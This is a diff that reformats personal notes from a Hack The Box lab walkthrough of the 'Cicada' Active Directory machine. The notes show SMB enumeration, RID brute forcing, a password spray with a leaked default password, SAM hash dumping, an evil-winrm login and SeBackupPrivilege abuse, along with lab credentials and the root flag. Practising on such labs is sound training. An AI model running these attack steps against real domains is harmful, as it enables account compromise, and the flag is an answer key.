@@ -247,16 +247,16 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ___
 
-
- =========================================( Target Information )=========================================
-
+*Enum4linux.ng*
+```
+ ======Target Information 
 Target ........... 10.10.11.35
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-=================================( Getting domain SID for 10.10.11.35 )=================================
+========Getting domain SID for 10.10.11.35 
 
 Can't load /etc/samba/smb.conf - run testparm to debug it
 Domain Name: CICADA
@@ -265,14 +265,13 @@ Domain Sid: S-1-5-21-917908876-1423158569-3159038727
 [+] Host is part of a domain (not a workgroup)
 
 
- ==================================( Share Enumeration on 10.10.11.35 )==================================
+ ===== Share Enumeration on 10.10.11.35 
 
 Can't load /etc/samba/smb.conf - run testparm to debug it
 
 	Sharename       Type      Comment
 	---------       ----      -------
 SMB1 disabled -- no workgroup available
-
 
 
 
@@ -283,8 +282,6 @@ SMB1 disabled -- no workgroup available
 [*] Check for random user
 [+] Server allows session using username 'lxglrasm', password ''
 [H] Rerunning enumeration with user 'lxglrasm' might give more 
-
-
 
 
 |    Shares via RPC on 10.10.11.35    |
@@ -326,7 +323,7 @@ SYSVOL:
 [+] Mapping: OK, Listing: DENIED
 [*] Testing share SYSVOL
 [+] Mapping: OK, Listing: DENIED
-
+```
 
 
 
@@ -335,7 +332,8 @@ found in SMB share port 445 with random user login:
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 
 
-kerbrute:
+Kerbrute:
+```
 2024/10/23 17:08:55 >  [+] VALID USERNAME:	administrator@cicada.htb
 
 2024/10/23 17:10:15 >  Using KDC(s):
@@ -347,9 +345,12 @@ kerbrute:
 2024/10/23 17:11:23 >  [+] VALID USERNAME:	Administrator@cicada.htb
 2024/10/23 17:15:50 >  [+] VALID USERNAME:	GUEST@cicada.htb
 
+```
 
 
-└> sudo nxc smb 10.10.11.35 -u 'mzxnhqhu' -p '' --rid-brute 4000
+*RID Brute*
+```
+sudo nxc smb 10.10.11.35 -u 'mzxnhqhu' -p '' --rid-brute 4000
 Using virtualenv: /usr/share/netexec/virtualenvs/netexec-PWU1S8Zj-py3.12
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\mzxnhqhu: (Guest)
@@ -384,10 +385,11 @@ SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrights
 SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
 SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
 SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+```
 
 
 
-# ===USERS===
+# Users
 
 SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
 SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
@@ -397,15 +399,15 @@ SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (Si
 SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
 
 
-# password spray in SMB:
-
-└> sudo nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
+# Password spray in SMB:
+```
+sudo nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
 Using virtualenv: /usr/share/netexec/virtualenvs/netexec-PWU1S8Zj-py3.12
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
-
+```
 
 
 found user and password combination:
@@ -413,9 +415,8 @@ found user and password combination:
 cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
 
 
-
 # AD Users
-
+```
 [+] After merging user results we have 8 user(s) total:
 '1104':
   username: john.smoulder
@@ -458,6 +459,8 @@ cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
   acb: '0x00020011'
   description: Key Distribution Center Service Account
 
+```
+
 
 # This guy just left his password as description
   username: david.orelious
@@ -467,6 +470,7 @@ cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
 
 
 # AD domain groups
+```
 1101':
   groupname: DnsAdmins
   type: local
@@ -524,12 +528,14 @@ cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
 '527':
   groupname: Enterprise Key Admins
   type: domain
+```
 
 
-
-# backup scripts found in \\DEV SMB network share
+# Backup scripts found in \\DEV SMB network share
 # cat Backup_script.ps1 
 
+
+```powershell
 $sourceDirectory = "C:\smb"
 $destinationDirectory = "D:\Backup"
 
@@ -541,6 +547,8 @@ $backupFileName = "smb_backup_$dateStamp.zip"
 $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
 Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
+
+```
 
 
 This user can acess \\ADMIN$ share
@@ -555,7 +563,6 @@ Q!3@Lp#M6b*7t*Vt
 3) emily.oscars cannot write to shares but can access admin share
 
 
-
 # Found system and sam files in user directory (dumped hashes with samdump2)
 
 
@@ -565,7 +572,8 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 *disabled* ä:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 
-# enumerated passwd policy
+# Enumerated passwd policy
+```
 
 [+] Found policy:
 Domain password information:
@@ -586,8 +594,10 @@ es
   Lockout threshold: None
 Domain logoff information:
   Force logoff time: not set
+```
 
-# evil-winrm
+
+# Evil-winrm
 
 emily user can be used to log in with evil-winrm
 
@@ -615,9 +625,10 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 
-
 used SeBackupPriviledge privilege to read files anywhere on the file system and then read the root flag at Administrator directory
 
+
+# Root
 
 root flag
 76ff047da8f136b7d605384652a87ec8
